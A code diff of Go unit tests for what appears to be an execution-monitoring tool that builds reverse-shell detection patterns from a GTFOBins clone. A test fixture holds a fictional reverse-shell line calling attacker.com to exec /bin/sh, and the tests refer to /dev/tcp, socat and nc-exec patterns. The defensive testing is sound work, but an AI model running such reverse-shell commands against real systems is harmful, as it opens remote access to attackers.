@@ -162,47 +162,59 @@ func TestEvidenceString_ProcEvent(t *testing.T) {
 	}
 }
 
-func TestLoadExecPatterns_FileMissing(t *testing.T) {
-	// Point home to a temp dir with no exec-patterns.toml — should return defaults.
+func TestLoadExecPatterns_CloneAbsent(t *testing.T) {
+	// Point home to a temp dir with no gtfobins clone — should return defaults.
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
 	patterns := loadExecPatterns()
 	if len(patterns) == 0 {
-		t.Fatal("loadExecPatterns returned empty slice when file is missing")
+		t.Fatal("loadExecPatterns returned empty slice when clone is absent")
+	}
+	// Verify at least one known default is present.
+	found := false
+	for _, p := range patterns {
+		if p.Name == "nc-exec" {
+			found = true
+		}
+	}
+	if !found {
+		t.Error("compiled-in nc-exec pattern missing from defaults")
 	}
 }
 
-func TestLoadExecPatterns_FilePresent(t *testing.T) {
+func TestLoadExecPatterns_ClonePresent(t *testing.T) {
+	// Set up a minimal fake GTFOBins clone with one binary YAML file.
 	tmp := t.TempDir()
-	coiDir := filepath.Join(tmp, ".coi")
-	if err := os.MkdirAll(coiDir, 0o755); err != nil {
+	binDir := filepath.Join(tmp, ".coi", "gtfobins", "_gtfobins")
+	if err := os.MkdirAll(binDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	tomlContent := `
-[[exec_pattern]]
-name = "custom-test"
-arg0 = "custom"
-keywords = ["--exploit"]
+	// Minimal GTFOBins YAML for a fictional binary "frobnicator".
+	yaml := `---
+functions:
+  reverse-shell:
+  - code: |-
+      frobnicator --connect attacker.com 12345 --exec /bin/sh
 `
-	if err := os.WriteFile(filepath.Join(coiDir, "exec-patterns.toml"), []byte(tomlContent), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(binDir, "frobnicator"), []byte(yaml), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	t.Setenv("HOME", tmp)
 
 	patterns := loadExecPatterns()
 
-	// Custom pattern must be present.
-	foundCustom := false
+	// The GTFOBins-derived pattern must be present.
+	foundDerived := false
 	for _, p := range patterns {
-		if p.Name == "custom-test" {
-			foundCustom = true
+		if p.Name == "frobnicator-reverse-shell" {
+			foundDerived = true
 		}
 	}
-	if !foundCustom {
-		t.Error("custom-test pattern from TOML file not found in merged result")
+	if !foundDerived {
+		t.Error("GTFOBins-derived frobnicator-reverse-shell pattern not found in merged result")
 	}
 
-	// At least one compiled-in default must also be present.
+	// Compiled-in defaults whose names aren't in the clone must still appear.
 	foundDefault := false
 	for _, p := range patterns {
 		if p.Name == "nc-exec" {
@@ -211,5 +223,29 @@ keywords = ["--exploit"]
 	}
 	if !foundDefault {
 		t.Error("compiled-in nc-exec pattern missing from merged result")
+	}
+}
+
+func TestGTFOBinsStripPlaceholders(t *testing.T) {
+	cases := []struct {
+		in   string
+		want string
+	}{
+		// Trailing slash preserved after stripping attacker placeholder + port.
+		{"/dev/tcp/attacker.com/12345", "/dev/tcp/"},
+		// Trailing slash preserved after stripping a numeric local-port component.
+		{"/inet/tcp/0/attacker.com/12345", "/inet/tcp/"},
+		// Pure placeholder token returns empty.
+		{"attacker.com", ""},
+		// Non-placeholder token passes through unchanged.
+		{"fsockopen", "fsockopen"},
+		// Numeric suffix without slash is stripped correctly.
+		{"socat/12345", "socat"},
+	}
+	for _, tc := range cases {
+		got := gtfobinsStripPlaceholders(tc.in)
+		if got != tc.want {
+			t.Errorf("gtfobinsStripPlaceholders(%q) = %q, want %q", tc.in, got, tc.want)
+		}
 	}
 }
